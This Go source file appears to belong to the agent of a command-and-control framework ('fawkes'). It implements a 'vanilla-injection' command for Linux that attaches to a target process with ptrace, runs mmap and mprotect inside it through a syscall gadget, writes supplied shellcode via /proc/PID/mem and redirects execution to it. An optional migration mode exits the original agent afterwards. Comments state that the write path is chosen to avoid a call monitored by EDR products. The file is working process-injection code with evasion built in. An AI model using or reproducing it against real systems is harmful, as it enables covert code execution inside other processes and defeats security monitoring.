//go:build linux && amd64

package commands

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

type VanillaInjectionCommand struct{}

func (c *VanillaInjectionCommand) Name() string { return "vanilla-injection" }
func (c *VanillaInjectionCommand) Description() string {
	return "Remote process injection via /proc/PID/mem direct write (T1055.009)"
}

func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[VanillaInjectionParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	if isMigrateAction(params.Action) {
		result := procMemInject(params.PID, shellcode)
		if result.Status == "success" {
			result.Output += "[*] Migration mode: injected payload into target process\n"
			result.Output += "[*] Scheduling agent exit in 5 seconds to allow response delivery...\n"
			go func() {
				time.Sleep(5 * time.Second)
				log.Printf("process migration complete — exiting original agent")
				os.Exit(0)
			}()
		}
		return result
	}

	return procMemInject(params.PID, shellcode)
}

// procMemInject performs remote process injection using /proc/PID/mem direct write.
// This avoids PTRACE_POKETEXT which is monitored by some EDR products, instead
// using direct file I/O on the /proc/PID/mem pseudo-file after ptrace attach.
func procMemInject(pid int, shellcode []byte) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))
	sb.WriteString("[*] Technique: /proc/PID/mem direct write\n")

	if _, err := os.Stat(fmt.Sprintf("/proc/%d", pid)); err != nil {
		return errorResult(sb.String() + fmt.Sprintf("[!] Process %d not found\n", pid))
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", pid))
	if err := syscall.PtraceAttach(pid); err != nil {
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
	}
	sb.WriteString("[+] Process stopped\n")

	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(pid, &origRegs); err != nil {
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))

	syscallAddr, err := findSyscallGadget(pid)
	if err != nil {
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))

	pageSize := uint64(4096)
	scSize := uint64(len(shellcode))
	if scSize > pageSize {
		pageSize = ((scSize + 4095) / 4096) * 4096
	}

	// Execute mmap(9) in target: allocate RW page
	allocAddr, err := execRemoteSyscall(pid, &origRegs, syscallAddr,
		9, 0, pageSize, 3, 0x22, 0xffffffffffffffff, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err))
	}
	if allocAddr >= 0xfffffffffffff000 {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", allocAddr))
	}
	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", allocAddr, pageSize))

	// Write shellcode via /proc/PID/mem (avoids PTRACE_POKETEXT)
	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	n, err := writeProcMem(memPath, allocAddr, shellcode)
	if err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes via /proc/%d/mem at 0x%X\n", n, pid, allocAddr))

	// Execute mprotect(10) in target: RW → RX
	mprotectRet, err := execRemoteSyscall(pid, &origRegs, syscallAddr,
		10, allocAddr, pageSize, 5, 0, 0, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err))
	}
	if mprotectRet != 0 {
		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
	} else {
		sb.WriteString("[+] mprotect: page now PROT_READ|PROT_EXEC\n")
	}

	// Redirect execution to shellcode
	newRegs := origRegs
	newRegs.Rip = allocAddr
	newRegs.Orig_rax = ^uint64(0)
	if err := syscall.PtraceSetRegs(pid, &newRegs); err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", allocAddr))

	sb.WriteString("[*] Continuing execution...\n")
	if err := syscall.PtraceCont(pid, 0); err != nil {
		_ = syscall.PtraceSetRegs(pid, &origRegs)
		_ = syscall.PtraceDetach(pid)
		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err))
	}

	if err := syscall.PtraceDetach(pid); err != nil {
		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached from process\n")
	}

	sb.WriteString("[+] /proc/mem injection completed successfully\n")
	return successResult(sb.String())
}

// execRemoteSyscall executes a syscall in the target process context via ptrace.
func execRemoteSyscall(pid int, origRegs *syscall.PtraceRegs, syscallAddr uint64,
	sysno, arg1, arg2, arg3, arg4, arg5, arg6 uint64) (uint64, error) {

	regs := *origRegs
	regs.Rip = syscallAddr
	regs.Rax = sysno
	regs.Rdi = arg1
	regs.Rsi = arg2
	regs.Rdx = arg3
	regs.R10 = arg4
	regs.R8 = arg5
	regs.R9 = arg6

	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		return 0, fmt.Errorf("set regs: %w", err)
	}
	if err := syscall.PtraceSingleStep(pid); err != nil {
		return 0, fmt.Errorf("single step: %w", err)
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		return 0, fmt.Errorf("wait4: %w", err)
	}
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		return 0, fmt.Errorf("get regs: %w", err)
	}

	return regs.Rax, nil
}
